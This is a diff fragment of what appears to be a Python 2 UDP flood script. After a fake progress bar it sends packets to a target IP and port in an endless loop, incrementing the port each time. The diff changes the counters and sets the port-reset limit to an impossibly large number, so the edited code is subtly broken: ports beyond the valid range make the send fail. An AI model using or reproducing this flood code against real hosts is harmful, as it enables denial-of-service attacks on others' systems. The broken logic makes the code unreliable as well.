@@ -39,11 +39,11 @@ print "[===============     ] 75%"
 time.sleep(5)
 print "[====================] 100%"
 time.sleep(1)
-sent = 30000
+sent = 300000
 while True:
      sock.sendto(bytes, (ip,port))
-     sent = sent + 2000000
+     sent = sent + 3
      port = port + 50
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 1000000:
+     if port == 100000000000000100000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000:
        port = 1
